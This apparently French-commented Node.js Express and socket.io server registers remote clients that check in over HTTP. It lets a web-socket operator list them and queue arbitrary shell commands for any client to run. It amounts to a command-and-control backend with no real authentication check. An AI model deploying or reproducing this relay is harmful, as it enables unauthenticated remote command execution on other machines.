// Importation des modules
var express = require('express');
var http = require('http');
var out = require('./inc/output');

/* Test pour JS Delivr */

var port = 18433;
/*Port en fonction de la date du jour 18 => 2018, 37 => 37 ème semaine, 4 => 4 ème jour (jeudi)*/

var app = express();

// Création du serveur
var serveur = http.Server(app);
var io = require('socket.io')(serveur);

app.use(express.static("public"));
app.set('view engine', 'ejs');

var clients = {};

// Les routes
app.get('/', function (req, res) {
    res.render('home');
});

app.get('/command', function (req, res) {

    var name = req.query.name;
    if (clients.hasOwnProperty(req.query.name)) {
        clients[name].time = req.query.time;
        clients[name].ver  = req.query.ver;
        clients[name].dir  = req.query.dir;
        clients[name].ip   = req.connection.remoteAddress;
    } else {
        var client = {};
        client.name = name;
        client.time = req.query.time;
        client.ver  = req.query.ver;
        client.dir  = req.query.dir;
        client.ip   = req.connection.remoteAddress;

        clients[client.name] = client;
    }

    res.end(JSON.stringify(clients[name]));
});

app.get('/reponse', function (req, res) {

    var name    = req.query.name;
    var erreur  = req.query.message;
    var reponse = {};

    if (erreur) {
        io.sockets.emit("reponse", {message: true, message: out.message(erreur)});
    }
    if (clients.hasOwnProperty(name)) {
        delete clients[name].commande;
        reponse.erreur = false;

    } else {
        reponse.erreur = true;
    }

    res.end(JSON.stringify(reponse));
});

//Gestion des évènements
io.sockets.on('connection', function (socket) {

    console.log("Morning...");
    socket.emit('auth');

    socket.on('command', function (data) {
        console.log(data);
        let reponse = {};
        reponse.token = data.token;
        reponse.erreur = false;
        if (data.global) {
            switch (data.exe) {
                case "lister":
                    reponse.resultat = out.lister(clients);
                    break;
                case "retirer":
                    var param = data.params;
                    if (param) {
                        if (data.params === "tout") {
                            for (var x in clients) if (clients.hasOwnProperty(x)) delete clients[x];
                        } else {
                            if (clients.hasOwnProperty(data.params)) delete clients[data.params];
                            else {
                                reponse.erreur = true;
                                reponse.message = out.message("Client inexistant");
                            }
                        }
                    } else {
                        reponse.erreur = true;
                        reponse.message = out.message("Paramètre manquant");
                    }

                    reponse.resultat = out.lister(clients);
                    break;
                default:
                    reponse.erreur = true;
                    reponse.message = out.message("Comande inconnue");
                    break;
            }
        } else {
            var cli = data.client;
            if (cli) {
                if (clients.hasOwnProperty(cli)) {
                    switch (data.exe) {
                        case "contenu":
                            clients[cli].commande = "ls > ls.txt";
                            break;
                        default:
                            clients[cli].commande = data.exe;
                            if (data.params) clients[cli].params = data.params;
                            break;
                    }
                    clients[cli].token = data.token;
                    reponse.resultat = out.message("Commande envoyée");
                } else {
                    reponse.erreur = true;
                    reponse.message = out.message("Client inexistant");
                }
            } else {
                reponse.erreur = true;
                reponse.message = out.message("Client non renseigné");
            }
        }

        socket.emit("reponse", reponse);
    });


    socket.on('disconnect', function () {
        console.log("Bye bye !")
    });
});

// Lancement du serveur
serveur.listen(port);

console.log('\n Go to http://localhost:' + port + "\n");